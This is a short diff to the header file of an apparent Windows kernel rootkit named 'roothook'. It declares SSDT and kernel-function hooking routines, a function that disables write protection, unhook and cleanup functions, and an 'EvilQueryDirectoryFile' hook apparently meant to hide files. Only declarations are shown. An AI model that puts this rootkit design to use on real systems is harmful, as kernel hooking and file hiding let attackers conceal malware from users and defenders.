@@ -6,6 +6,7 @@
 namespace roothook {
 	NTSTATUS SystemFunctionHook(PVOID HookingFunction, const char* ModuleName, const char* RoutineName, BOOL ToSave, ULONG Tag);  // Hook to a function from the windows 10 kernel / from a driver
 	NTSTATUS HookHandler(PVOID hookedf_params);  // Handles the hooking to another kernel function of the wanted external function
+	BOOL CleanAllHooks();  // Clean all SSDT hooks
 	namespace SSDT {
 		ULONG GetSystemCallIndex(PUNICODE_STRING SystemServiceName);  // Get the index of a system service in the SSDT with its name
 		KIRQL DisableWriteProtection();   // Disable write protection to be able to write (like in an SSDT hook)
@@ -14,7 +15,7 @@ namespace roothook {
 		ULONG64 GetServiceDescriptorTable();  // Get the base address of the actual SSDT in memory
 		ULONG GetOffsetFromSSDTBase(ULONG64 FunctionAddress);  // Get the offset of a function/address from the base of the SSDT table (used to calculate entry value)
 		NTSTATUS SystemServiceDTHook(PVOID HookingFunction, ULONG Tag);  // Perform an SSDT hook
-		NTSTATUS SystemServiceDTUnhook(PVOID HookingFunction, ULONG SyscallNumber);  // Unhook the SSDT entry
+		NTSTATUS SystemServiceDTUnhook(ULONG Tag);  // Unhook the SSDT entry
 	}
 	NTSTATUS EvilQueryDirectoryFile(IN HANDLE FileHandle,
 		IN HANDLE Event OPTIONAL,
